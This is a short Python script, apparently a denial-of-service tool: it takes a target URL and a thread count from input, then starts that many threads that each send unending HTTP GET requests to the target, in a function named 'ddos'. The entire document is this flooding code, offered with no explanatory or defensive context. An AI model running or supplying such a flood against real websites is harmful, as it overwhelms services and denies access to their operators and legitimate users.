import requests, threading
url = input()
thr = input()
def ddos():
    while True:
        r = requests.get(url)
        print(r)

for i in range(int(thr)):
    thr = threading.Thread(target=ddos)
    thr.start()
